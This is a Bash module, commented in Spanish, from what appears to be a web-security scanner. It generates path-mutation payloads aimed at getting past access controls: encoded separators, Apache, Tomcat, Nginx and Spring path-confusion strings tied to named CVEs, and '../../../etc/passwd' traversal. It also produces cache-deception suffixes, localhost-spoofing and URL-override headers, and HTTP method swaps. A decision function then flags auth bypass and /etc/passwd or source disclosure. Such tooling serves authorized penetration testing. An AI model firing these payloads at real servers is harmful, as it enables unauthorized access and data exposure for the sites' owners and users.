#!/usr/bin/env bash
# ============================================================
#  core/path_mutations.sh
#
#  Catálogo unificado de mutaciones de path para auditar
#  normalization, confusion, tricks y bypasses con un único
#  generador. Compatible con el shell harness de hackeadora:
#
#    source core/path_mutations.sh
#    while IFS=$'\t' read -r CLASS PATH_VAR EXTRA; do
#      ...
#    done < <(_path_mutate_all "/admin/users")
#
#  Cada línea de salida es:
#    CLASS<TAB>MUTATED_PATH<TAB>EXTRA
#
#  Donde:
#    CLASS         normalization | encoding | confusion |
#                  tricks | header-bypass | method-bypass | suffix
#    MUTATED_PATH  el path completo a probar (con prefijo / si aplica)
#    EXTRA         para header-bypass: "Header-Name: value"
#                  para method-bypass: nombre del método (POST/PUT/...)
#                  vacío para clases que solo modifican path
#
#  Notas:
#  - El generador asume que el path empieza con "/" (e.g. "/admin").
#    Si llega sin "/" se normaliza.
#  - Algunas mutaciones usan placeholders dentro del path
#    (e.g. la / interior); se aplican carácter a carácter cuando
#    el path tiene segmentos múltiples.
# ============================================================

# ── Helpers internos ────────────────────────────────────────
_pm_normalize() {
  local P="$1"
  [[ -z "$P" ]] && { echo "/"; return; }
  [[ "${P:0:1}" != "/" ]] && P="/$P"
  echo "$P"
}

_pm_emit() {
  # $1=class $2=path $3=extra (opcional)
  printf '%s\t%s\t%s\n' "$1" "$2" "${3:-}"
}

# Reemplaza cada `/` interior del path por un valor (deja intacto el prefijo "/").
# Uso: _pm_replace_slashes /admin/users %2f → /admin%2fusers
_pm_replace_slashes() {
  local P="$1" REPL="$2"
  echo "/${P#/}" | sed "s|/|${REPL}|g; s|^${REPL}|/|"
}

# Reemplaza `.` interior por un valor (no toca el prefijo "/").
_pm_replace_dots() {
  local P="$1" REPL="$2"
  echo "$P" | sed "s|\.|${REPL}|g"
}

# ── Catálogo: normalization ─────────────────────────────────
_pm_normalization() {
  local P="$1"
  _pm_emit normalization "${P}/"
  _pm_emit normalization "${P}/."
  _pm_emit normalization "${P}//"
  _pm_emit normalization "/${P#/}"
  _pm_emit normalization "//${P#/}"
  _pm_emit normalization "/./${P#/}"
  _pm_emit normalization "${P}/./"
  _pm_emit normalization "${P}/../${P##*/}"
  _pm_emit normalization "${P}/.."
  _pm_emit normalization "${P}/../"
  _pm_emit normalization "${P}/*"
  _pm_emit normalization "${P}/."
  _pm_emit normalization "${P}/.;"
  _pm_emit normalization "${P}/;"
  _pm_emit normalization "/.${P}"
}

# ── Catálogo: encoding ──────────────────────────────────────
# Reemplaza separadores con encodings que el WAF/proxy no
# normaliza pero el backend sí.
_pm_encoding() {
  local P="$1"
  # Slash encodings (lower/upper/double-encoded)
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%2f')"
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%2F')"
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%252f')"
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%252F')"
  # UTF-8 overlong slash (CVE-2001-0131 clásico)
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%c0%af')"
  # Unicode fullwidth slash (AWS ALB + Apache)
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%ef%bc%8f')"
  # Backslash variants (Windows backends / IIS)
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%5c')"
  _pm_emit encoding "$(_pm_replace_slashes "$P" '%255c')"
  # Dot encodings — útiles cuando el WAF detecta `..` literal
  _pm_emit encoding "$(_pm_replace_dots "$P" '%2e')"
  _pm_emit encoding "$(_pm_replace_dots "$P" '%252e')"
  _pm_emit encoding "$(_pm_replace_dots "$P" '%ef%bc%8e')"
  # Tab/null en path
  _pm_emit encoding "${P}%09"
  _pm_emit encoding "${P}%00"
  _pm_emit encoding "${P}%20"
}

# ── Catálogo: confusion ─────────────────────────────────────
# Técnicas Orange Tsai BlackHat 2018/2024 + CVEs de path
# confusion. Cada una explota una discrepancia entre cómo el
# proxy/WAF interpreta el path vs el backend.
_pm_confusion() {
  local P="$1"
  # Apache filename confusion (CVE-2024-38475): bypass ACL via ?
  _pm_emit confusion "${P}?" "apache_filename_confusion"
  _pm_emit confusion "${P}%23" "apache_hash_bypass"
  _pm_emit confusion "${P}%3F" "apache_qm_encoded"
  _pm_emit confusion "${P}%3f" "apache_qm_lower"
  # Tomcat semicolon path confusion (CVE-2025-24813)
  _pm_emit confusion "${P};" "tomcat_trailing_semi"
  _pm_emit confusion "${P}/.." "dot_dot_no_slash"
  _pm_emit confusion "${P}/..;/" "tomcat_semi_traversal"
  _pm_emit confusion "${P}/..%3b/" "tomcat_semi_encoded"
  _pm_emit confusion "${P}/..%253b/" "tomcat_semi_double_encoded"
  # Nginx alias off-by-slash (Orange Tsai BH2018)
  _pm_emit confusion "${P}../" "nginx_off_by_slash"
  # Spring static resource bypass (CVE-2024-38819)
  _pm_emit confusion "${P}/../../../etc/passwd" "spring_traversal"
  _pm_emit confusion "${P}/..%2F..%2F..%2Fetc%2Fpasswd" "spring_traversal_enc"
}

# ── Catálogo: tricks ────────────────────────────────────────
# Manipulaciones case + suffix que algunos servidores tratan
# distinto al path canónico.
_pm_tricks() {
  local P="$1"
  # Case manipulation (Apache es case-sensitive en Linux pero
  # los WAF pueden filtrar minúsculas y dejar pasar otras)
  if command -v python3 &>/dev/null; then
    local UPPER LOWER TITLE
    UPPER=$(python3 -c "import sys; print(sys.argv[1].upper())" "$P")
    LOWER=$(python3 -c "import sys; print(sys.argv[1].lower())" "$P")
    TITLE=$(python3 -c "import sys; s=sys.argv[1]; print(s[:1] + s[1:2].upper() + s[2:])" "$P")
    _pm_emit tricks "$UPPER"
    _pm_emit tricks "$LOWER"
    _pm_emit tricks "$TITLE"
  fi
  # Trailing chars que confunden parsers
  _pm_emit tricks "${P}#"
  _pm_emit tricks "${P}#/"
  _pm_emit tricks "${P}.."
  _pm_emit tricks "${P}~"
  _pm_emit tricks "${P}~1"
  _pm_emit tricks "${P}*"
  # NB: brace expansion `{,}` removido — curl la expande client-side
  # (se duplica el request) y produce FPs sistemáticos
}

# ── Catálogo: suffix (cache deception + filename confusion) ─
# Append de extensiones estáticas — cache cree que es asset y
# lo guarda; backend ignora el sufijo y devuelve datos privados.
_pm_suffix() {
  local P="$1"
  for EXT in css js png jpg ico woff svg json html xml; do
    _pm_emit suffix "${P}.${EXT}"
    _pm_emit suffix "${P}/.${EXT}"
    _pm_emit suffix "${P};.${EXT}"
    _pm_emit suffix "${P}%00.${EXT}"
  done
}

# ── Catálogo: header-bypass ─────────────────────────────────
# El path NO se modifica; se inyectan headers que algunos
# proxies/frameworks usan para sobrescribir la ruta interna o
# saltarse ACLs basadas en IP.
_pm_header_bypass() {
  local P="$1"
  # Path override headers (X-Original-URL, X-Rewrite-URL...)
  for HDR in \
    "X-Original-URL" \
    "X-Rewrite-URL" \
    "X-Override-URL" \
    "X-HTTP-Path-Override" \
    "X-Forwarded-Path" \
    "X-Forwarded-URI" ; do
    _pm_emit header-bypass "$P" "${HDR}: ${P}"
  done
  # Localhost spoofing — bypass de ACL "interna"
  for HDR in \
    "X-Forwarded-For" \
    "X-Real-IP" \
    "X-Originating-IP" \
    "X-Remote-IP" \
    "X-Remote-Addr" \
    "X-Client-IP" \
    "True-Client-IP" \
    "Cluster-Client-IP" \
    "X-ProxyUser-Ip" \
    "X-Custom-IP-Authorization" ; do
    _pm_emit header-bypass "$P" "${HDR}: 127.0.0.1"
    _pm_emit header-bypass "$P" "${HDR}: localhost"
  done
  # Host header tricks
  _pm_emit header-bypass "$P" "X-Forwarded-Host: localhost"
  _pm_emit header-bypass "$P" "X-Host: localhost"
  _pm_emit header-bypass "$P" "X-Forwarded-Server: localhost"
  # Authorization spoofing (algunos backends en local skip auth)
  _pm_emit header-bypass "$P" "Referer: http://localhost${P}"
}

# ── Catálogo: method-bypass ─────────────────────────────────
# Mismo path, distinto método HTTP. Algunos frameworks
# protegen GET pero olvidan otros métodos.
_pm_method_bypass() {
  local P="$1"
  for M in POST PUT PATCH HEAD DELETE OPTIONS; do
    _pm_emit method-bypass "$P" "$M"
  done
}

# ── API pública: generador unificado ────────────────────────
# _path_mutate_all <path>
# Imprime una línea por mutación: CLASS\tMUTATED_PATH\tEXTRA
# Deduplica:
#  - Mutaciones cuyo path resultante == path original (no-op)
#    Solo para clases que SOLO modifican path (no headers ni method).
#  - Líneas exactamente repetidas.
_path_mutate_all() {
  local P
  P=$(_pm_normalize "$1")

  {
    _pm_normalization "$P"
    _pm_encoding      "$P"
    _pm_confusion     "$P"
    _pm_tricks        "$P"
    _pm_suffix        "$P"
    _pm_header_bypass "$P"
    _pm_method_bypass "$P"
  } | awk -F'\t' -v ORIG="$P" '
    {
      key = $1 "\t" $2 "\t" $3
      if (seen[key]++) next
      # No-op: clases path-only que no cambiaron el path
      if (($1 == "normalization" || $1 == "encoding" || $1 == "tricks") \
          && $2 == ORIG && $3 == "") next
      print
    }'
}

# ── Decisor: clasificar divergencia entre baseline y mutación ─
# Devuelve por stdout: <severity>|<verdict_label>|<reason>
# severity ∈ critical | high | medium | low | none
#
# Args:
#   $1 = baseline_status   (e.g. 403)
#   $2 = baseline_len      (bytes)
#   $3 = mutation_status   (e.g. 200)
#   $4 = mutation_len
#   $5 = mutation_body_snippet (primeros ~2000 bytes)
#   $6 = mutation_headers
#   $7 = root_host (https://x.com) — opcional, para is_same_as_root
_path_diff_test() {
  local B_S="$1" B_L="$2" M_S="$3" M_L="$4"
  local M_BODY="$5" M_HDRS="$6" ROOT="${7:-}"

  # Sin respuesta → no actionable
  [[ "$M_S" == "000" || "$M_S" == "" ]] && { echo "none|no_response|sin respuesta de red"; return; }

  # Si la mutación llega a CF Access o SPA shell → FP
  if type is_likely_fp_response &>/dev/null; then
    if is_likely_fp_response "$ROOT" "$M_BODY" "$M_HDRS"; then
      echo "none|fp|CF Access o SPA shell"; return
    fi
  fi

  # ── Detección de info disclosure (alta prioridad) ─────────
  if [[ "$M_S" =~ ^5 ]]; then
    if echo "$M_BODY" | grep -qiP '(at\s+(com|org|java)\.|Traceback \(most recent|StackOverflowError|/var/www/|/home/[a-z]|root:[x*]?:0:)'; then
      echo "high|info_disclosure_5xx|Stack trace o paths expuestos en respuesta 5xx"; return
    fi
  fi
  # Source disclosure en cualquier 200
  if [[ "$M_S" == "200" ]] && echo "$M_BODY" | grep -qP '<\?php|<\?=|mysql_connect|PDO::|\$_(GET|POST|SERVER)|require_once'; then
    echo "critical|source_disclosure|Código fuente PHP/server-side expuesto"; return
  fi
  # /etc/passwd disclosure
  if echo "$M_BODY" | grep -qP 'root:[x*]?:0:0:'; then
    echo "critical|etc_passwd_disclosure|/etc/passwd leído via path traversal"; return
  fi

  # ── Bypass de auth: 401/403 → 200 ─────────────────────────
  if [[ "$B_S" =~ ^(401|403)$ ]] && [[ "$M_S" == "200" ]]; then
    # Verificar que no sea SPA catch-all idéntico al root
    echo "high|auth_bypass|Path protegido $B_S → 200 con mutación"; return
  fi

  # ── 403/401 → 5xx: WAF/parser confusion ──────────────────
  if [[ "$B_S" =~ ^(401|403)$ ]] && [[ "$M_S" =~ ^5 ]]; then
    echo "medium|parser_confusion|$B_S → $M_S indica que la mutación pasa el WAF y rompe el backend"; return
  fi

  # ── Cambio de status sin caer en 4xx pero distinto ───────
  if [[ "$B_S" != "$M_S" ]] && [[ "$M_S" != "404" ]] && [[ "$M_S" != "400" ]]; then
    echo "low|status_diverged|baseline=$B_S mutation=$M_S"; return
  fi

  # ── Mismo status, body distinto significativamente ───────
  if [[ "$B_S" == "$M_S" ]] && [[ -n "$B_L" ]] && [[ -n "$M_L" ]]; then
    local DIFF=$(( B_L - M_L ))
    [[ "$DIFF" -lt 0 ]] && DIFF=$(( -DIFF ))
    # Diferencia >300 bytes y >10% del baseline → algo cambió
    if [[ "$DIFF" -gt 300 ]] && [[ "$B_L" -gt 0 ]] && (( DIFF * 10 > B_L )); then
      echo "low|body_diverged|baseline=${B_L}b mutation=${M_L}b (diff ${DIFF}b)"; return
    fi
  fi

  echo "none|noop|sin divergencia"
}
